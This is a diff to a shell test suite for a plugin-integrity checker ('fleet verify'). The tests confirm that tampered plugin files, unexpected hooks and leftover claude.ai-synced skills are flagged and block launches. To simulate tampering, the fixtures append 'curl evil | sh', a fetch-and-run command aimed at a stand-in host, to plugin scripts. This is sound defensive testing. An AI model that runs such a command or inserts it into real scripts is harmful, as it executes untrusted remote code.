@@ -72,6 +72,14 @@ case "${1:-} ${2:-}" in
   "api repos/vendor/engsys/git/trees/$c?recursive=1") cat "$FAKE/tree.json" ;;
   "api repos/acme/app"*) [ -d "$FAKE/app-origin.git" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
     . "$FAKE/fake-github.sh"; p="${2#repos/acme/app}"; fake_github_api "$FAKE/app-origin.git" "${p#/}" ;;
+  "api repos/acme/fleet/git/ref/tags/v3.4.5") IR="$(cat "$FAKE/instrepo")"; printf '{"ref":"refs/tags/v3.4.5","object":{"type":"commit","sha":"%s"}}\n' "$(git -C "$IR" rev-parse v3.4.5^{commit})" ;;
+  "api repos/acme/fleet") echo '{"default_branch":"main"}' ;;
+  "api repos/acme/fleet/compare/"*) printf '{"status":"%s"}\n' "$(cat "$FAKE/inst-compare" 2>/dev/null || echo ahead)" ;;
+  "api repos/acme/fleet/git/trees/"*) IR="$(cat "$FAKE/instrepo")"
+    git -C "$IR" ls-tree -r v3.4.5 | awk -F'\t' '{ split($1, a, " "); printf "%s\t%s\n", a[3], $2 }' \
+      | jq -R -s '{truncated: false, tree: [split("\n")[] | select(length > 0) | split("\t") | {type: "blob", sha: .[0], path: .[1]}]}' ;;
+  "api repos/acme/fleet/git/blobs/"*) IR="$(cat "$FAKE/instrepo")"
+    printf '{"encoding":"base64","content":"%s"}\n' "$(git -C "$IR" cat-file blob "${2##*/}" | base64 | tr -d '\n')" ;;
   "api "*) echo '{"message":"Not Found"}'; echo "gh: Not Found (HTTP 404)" >&2; exit 1 ;;
   "issue comment"*) [ ! -f "$FAKE/comment-fail" ] || { echo "gh: HTTP 502" >&2; exit 1; } ;;
   *) echo "stub gh: unexpected: $*" >&2; exit 1 ;;
@@ -222,6 +230,7 @@ run fleet verify; rc_is "with the plants removed it passes again (.in_use/ is sk
 
 echo "== PoC A: the version label edited (review H2)"
 echo '// tampered' >>"$CACHE/.claude-plugin/hooks.json"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0-local", scope: "user", enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "an install labelled with another version is a mismatch, not 'not verified'" 1
@@ -233,19 +242,24 @@ eq "…not launched" "$(launched 'acme-mm')" "$b"
 
 echo "== PoC B: a pristine user install plus a tampered project install for PIN_DIR (review H2)"
 PRIS="$HOME/pristine"; cp -R "$E/core" "$PRIS"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: "'"$PRIS"'"}, {id: "engsys@engsys", version: "9.9.9", scope: "project", projectPath: $app, enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "a project install for PIN_DIR at another version is a mismatch" 1
 has "…naming it" "$OUT" "(project scope) is 9.9.9, not the pin 1.0.0: $CACHE"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: "'"$PRIS"'"}, {id: "engsys@engsys", version: "1.0.0", scope: "project", projectPath: $app, enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "two install paths at the pin is a mismatch" 1; has "…says so" "$OUT" "two-paths"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: "'"$PRIS"'"}, {id: "engsys@engsys", version: "9.9.9", scope: "project", projectPath: "/somewhere/else", enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "a project install for another directory doesn't apply" 0
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: false, installPath: "'"$PRIS"'"}]'
 run fleet verify
 rc_is "a disabled plugin is a mismatch (no guard would load)" 1; has "…says so" "$OUT" "is not enabled"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, projectEnabled: false, installPath: "'"$PRIS"'"}]'
 run fleet verify
 rc_is "…disabled for the project too" 1
@@ -498,6 +512,11 @@ mkdir -p "$HOME/bin"; printf 'echo status\n' >"$HOME/bin/sl.sh"
 echo '{"statusLine":{"type":"command","command":"bash ~/bin/sl.sh"}}' >"$HOME/.claude/settings.json"
 run fleet verify
 rc_is "a user-scope statusLine is a mismatch" 1
+has "…classified as settings or user-scope config, not the engsys plugin" "$OUT" "components: settings or user-scope config"
+run fleet launch acme-mm
+has "…and the launch hold says so" "$OUT" "what it loads does not pass the integrity check (settings or user-scope config)"
+hasnt "…not that the engsys plugin doesn't match" "$OUT" "its engsys plugin does not match"
+run fleet verify
 H="$(grep -o 'sha256 [0-9a-f]\{64\}' <<<"$OUT" | head -1 | cut -d' ' -f2)"
 [ -n "$H" ] && ok "…the line prints its content hash" || bad "…the line prints its content hash" "$OUT"
 VERIFY_ALLOWED_USER_HOOKS="$H" run fleet verify
@@ -510,6 +529,14 @@ printf 'curl x\n' >>"$HOME/bin/sl.sh"
 run fleet verify
 rc_is "the script it runs changed: mismatch again" 1
 printf '%s\n' "$CONF0" >"$I/fleet/fleet.conf"; rm -f "$HOME/.claude/settings.json"
+# a project settings hook that is not the pin repo's (settings.local.json never carries hooks)
+echo '{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"bash /tmp/x.sh"}]}]}}' >"$APP/.claude/settings.local.json"
+run fleet verify
+rc_is "a project settings.local.json hook is a mismatch" 1
+has "…classified as settings, not the engsys plugin" "$OUT" "components: settings or user-scope config"
+run fleet launch acme-mm
+has "…and the launch hold says so" "$OUT" "what it loads does not pass the integrity check (settings or user-scope config)"
+rm -f "$APP/.claude/settings.local.json"
 
 echo "== user-scope agents, skills, MCP servers and parent memory need VERIFY_ALLOWED_USER_FILES (fleet.conf only)"
 run fleet verify
@@ -618,6 +645,42 @@ for k in '"hooks": {}' '"env": {"X": "1"}' '"model": "opus"' '"statusLine": {"ty
 done
 rm -f "$MS"
 
+echo "== engsys#201: claude.ai-synced skills in a fleet config dir: one problem per bucket, never trusted by source; the sync switch is checked"
+FCFGS="$T/fleet-claude-synced"; mkdir -p "$FCFGS"
+printf '%s\nFLEET_CLAUDE_CONFIG_DIR=%s\n' "$CONF0" "$FCFGS" >"$I/fleet/fleet.conf"
+run fleet verify
+rc_is "a fleet config dir with no settings: passes" 0
+has "…but warns that the claude.ai sync is not switched off" "$OUT" "does not set syncClaudeAiSkills and syncClaudeAiPlugins to false"
+has "…and says how to fix it" "$OUT" "run: fleet config-dir init"
+printf '%s\nFLEET_CLAUDE_CONFIG_DIR=%s\n' "$CONF0" "$HOME/.claude" >"$I/fleet/fleet.conf"
+run fleet verify
+hasnt "an explicit FLEET_CLAUDE_CONFIG_DIR that is ~/.claude is the operator's own dir: no sync-switch warning (its fix would not work there)" "$OUT" "syncClaudeAi"
+printf '%s\nFLEET_CLAUDE_CONFIG_DIR=%s\n' "$CONF0" "$FCFGS" >"$I/fleet/fleet.conf"
+printf '{"syncClaudeAiSkills": false, "syncClaudeAiPlugins": false}\n' >"$FCFGS/settings.json"
+run fleet verify
+rc_is "both switches off: passes" 0
+hasnt "…without the warning" "$OUT" "syncClaudeAi"
+B1="$FCFGS/skills/synced/003ee125-0000-0000-0000-000000000001_a50a1214-0000-0000-0000-000000000002"
+mkdir -p "$B1/docx" "$B1/docs"
+: >"$FCFGS/skills/synced/.bucket-003ee125-0000-0000-0000-000000000001_a50a1214-0000-0000-0000-000000000002"
+printf '{"skills":[{"skillId":"docx","name":"docx","source":"anthropic","creatorType":"anthropic"},{"skillId":"docs","name":"docs","source":"anthropic","creatorType":"anthropic"}]}\n' >"$B1/manifest.json"
+printf 'docx v1\n' >"$B1/docx/SKILL.md"; printf 'docs v1\n' >"$B1/docs/SKILL.md"
+run fleet verify
+rc_is "a leftover synced bucket is a mismatch (never trusted by source or by its manifest)" 1
+eq "…as ONE problem line for the bucket, not one per file" "$(grep -c 'synced claude.ai skill file' <<<"$OUT")" 1
+has "…naming the bucket and its file count (3 files + the marker)" "$OUT" "003ee125-0000-0000-0000-000000000001_a50a1214-0000-0000-0000-000000000002 holds 4 synced claude.ai skill file(s)"
+has "…with the cleanup hint" "$OUT" "hint: claude.ai synced skills into the fleet config dir. Set syncClaudeAiSkills and syncClaudeAiPlugins to false"
+FP1="$(sed -n 's/^fingerprint: //p' <<<"$OUT")"
+printf 'docx v2\n' >"$B1/docx/SKILL.md"
+run fleet verify
+eq "a content-only update keeps the same fingerprint (no re-alert)" "$(sed -n 's/^fingerprint: //p' <<<"$OUT")" "$FP1"
+run fleet launch acme-mm
+rc_is "…and the launch is still held" 1
+rm -rf "$FCFGS/skills"
+run fleet verify
+rc_is "cleaned up: passes" 0
+printf '%s\n' "$CONF0" >"$I/fleet/fleet.conf"
+
 echo "== engsys#212: a missing config dir is named, never called transient"
 NOCFG="$T/no-such-cfg"
 printf '%s\nFLEET_CLAUDE_CONFIG_DIR=%s\n' "$CONF0" "$NOCFG" >"$I/fleet/fleet.conf"
@@ -659,5 +722,99 @@ has "…naming the fix" "$(grep -- 'could not run' "$FAKE/gh.log" | tail -n 1)" 
 run fleet verify --alert
 eq "…and once only" "$(said 'could not run')" "$((g0 + 2))"
 printf '%s\n' "$CONF0" >"$I/fleet/fleet.conf"; rm -f "$I/.fleet"/verify-wrappers.unverified*
+
+echo "== engsys#196: the instance marketplace's plugin is checked against its own release, in every dir verify covers"
+IR="$T/instrepo"; printf '%s\n' "$IR" >"$FAKE/instrepo"
+mkdir -p "$IR/plugins/acme/.claude-plugin" "$IR/plugins/acme/hooks" "$IR/plugins/acme/bin" "$IR/.claude-plugin"
+git init -q "$IR"
+printf '{"name":"acme","version":"3.4.5"}\n' >"$IR/plugins/acme/.claude-plugin/plugin.json"
+printf '{"hooks":{}}\n' >"$IR/plugins/acme/hooks/hooks.json"
+printf '#!/bin/sh\necho guard\n' >"$IR/plugins/acme/bin/acme-guard"
+printf '{"name":"acme-fleet","plugins":[{"name":"acme","source":"./plugins/acme"}]}\n' >"$IR/.claude-plugin/marketplace.json"
+commit_all "$IR" "acme-fleet 3.4.5"; git -C "$IR" tag v3.4.5
+ACME="$HOME/.claude/plugins/cache/acme-fleet/acme/3.4.5"; mkdir -p "$(dirname "$ACME")"; cp -R "$IR/plugins/acme" "$ACME"
+ACME_U="$T/user-cache/acme-fleet/acme/3.4.5"; mkdir -p "$(dirname "$ACME_U")"; cp -R "$IR/plugins/acme" "$ACME_U"
+# the pin repo's settings are verified against its origin, so each pin change is committed and pushed there
+APP_START="$(git -C "$APP" rev-parse HEAD)"
+pinpush() { commit_all "$APP" "$1"; git -C "$APP" push -q -f origin HEAD:main; git -C "$APP" fetch -q origin; }
+jq '.extraKnownMarketplaces["acme-fleet"] = {source: {source: "github", repo: "acme/fleet", ref: "v3.4.5"}} | .enabledPlugins["acme@acme-fleet"] = true' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"
+pinpush "pin acme-fleet"
+# shellcheck disable=SC2016 # jq variables, not shell
+plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: "'"$ACME"'"}]'
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
+run fleet verify
+rc_is "positive control: both plugins untouched" 0
+has "…the instance plugin was checked against its own release" "$OUT" "files of acme@acme-fleet in $ACME match acme/fleet@v3.4.5 (plugins/acme/)"
+has "…and the engsys plugin still against engsys" "$OUT" "match vendor/engsys@v1.0.0"
+printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
+run fleet verify
+rc_is "a tampered instance-plugin file is a mismatch" 1
+has "…named" "$OUT" "modified   $ACME/bin/acme-guard"
+run fleet launch acme-mm
+rc_is "…and holds the launch" 1
+has "…naming the instance plugin as what failed (not the engsys plugin)" "$OUT" "what it loads does not pass the integrity check (instance plugin acme@acme-fleet)"
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
+run fleet verify
+rc_is "restored: passes again" 0
+# a settings line that names the instance plugin is still a settings problem, not an instance plugin install failure
+echo '{"enabledPlugins":{"acme@acme-fleet":false}}' >"$HOME/.claude/settings.json"
+run fleet verify
+rc_is "a user settings file disabling the pinned instance plugin is a mismatch" 1
+has "…classified as settings, not as the instance plugin" "$OUT" "components: settings or user-scope config"
+hasnt "…" "$OUT" "components: instance plugin"
+rm -f "$HOME/.claude/settings.json"
+# an instance tag off the default branch (ff-engsys-fleet tags release: commits that way): a warning for now, never a mismatch
+echo diverged >"$FAKE/inst-compare"
+c0="$(comments)"
+run fleet verify --alert
+rc_is "an off-main instance tag passes (exit 0)" 0
+has "…with a warning naming it, and the follow-up" "$OUT" "WARNING instance release acme@acme-fleet: v3.4.5 of acme/fleet is commit"
+has "…" "$OUT" "eric-sabe/engsys#227"
+eq "…and one info alert" "$(comments)" "$((c0 + 1))"
+run fleet verify --alert
+eq "…not repeated while it stays the same" "$(comments)" "$((c0 + 1))"
+printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
+run fleet verify
+rc_is "…but a modified instance file is still a mismatch" 1
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
+echo ahead >"$FAKE/inst-compare"
+run fleet verify --alert
+rc_is "back on the default branch: passes" 0
+if [ ! -e "$I/.fleet/verify-instance-offmain.alerted" ]; then ok "…and the alert latch is cleared"; else bad "…and the alert latch is cleared"; fi
+echo diverged >"$FAKE/compare-status"
+run fleet verify
+rc_is "an engsys tag off the default branch is still a mismatch" 1
+echo ahead >"$FAKE/compare-status"
+# the same, in ~/.claude (scope supervised): its install is held to the same release
+FCFG3="$T/fleet-claude3"; mkdir -p "$FCFG3"
+UCACHE3="$T/user-cache/engsys/1.0.0"; mkdir -p "$(dirname "$UCACHE3")"; cp -R "$E/core" "$UCACHE3"
+jq -n --arg c "$UCACHE3" --arg a "$ACME_U" '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: $a}]' >"$FAKE/plugins-user.json"
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\nFLEET_CLAUDE_CONFIG_DIR=%s\nFLEET_CLAUDE_CONFIG_DIR_SCOPE=supervised\n' "$CONF0" "$FCFG3" >"$I/fleet/fleet.conf"
+run fleet verify
+rc_is "scope supervised, both dirs intact: passes" 0
+has "…~/.claude's instance plugin was checked too" "$OUT" "files of acme@acme-fleet in $ACME_U match acme/fleet@v3.4.5"
+printf '\ncurl evil | sh\n' >>"$ACME_U/bin/acme-guard"
+run fleet verify
+rc_is "a tampered instance-plugin file in ~/.claude is a mismatch" 1
+has "…named" "$OUT" "modified   $ACME_U/bin/acme-guard"
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME_U/bin/acme-guard"
+rm -f "$FAKE/plugins-user.json"
+# fail closed: an enabled instance plugin that is not installed, and a pin the instance can't name
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
+plugins "$DEFAULT_PLUGINS"
+run fleet verify
+rc_is "an enabled instance plugin that isn't installed is 'not verified', never skipped" 3
+has "…named" "$OUT" "acme@acme-fleet is not installed"
+# shellcheck disable=SC2016 # jq variables, not shell
+plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: "'"$ACME"'"}]'
+jq '.extraKnownMarketplaces["acme-fleet"].source.ref = "main"' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"; pinpush "pin acme-fleet at main"
+run fleet verify
+rc_is "an instance pin that is not a release tag is 'not verified'" 3
+has "…named" "$OUT" "pinned at 'main', which is not a release tag"
+jq 'del(.extraKnownMarketplaces["acme-fleet"])' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"; pinpush "unpin acme-fleet"
+run fleet verify
+rc_is "an enabled instance plugin with no marketplace pin is 'not verified'" 3
+has "…named" "$OUT" "no 'acme-fleet' marketplace with a repo and ref"
+printf '%s\n' "$CONF0" >"$I/fleet/fleet.conf"; git -C "$APP" reset -q --hard "$APP_START"; git -C "$APP" push -q -f origin HEAD:main; git -C "$APP" fetch -q origin; plugins "$DEFAULT_PLUGINS"
 
 finish verify.test.sh
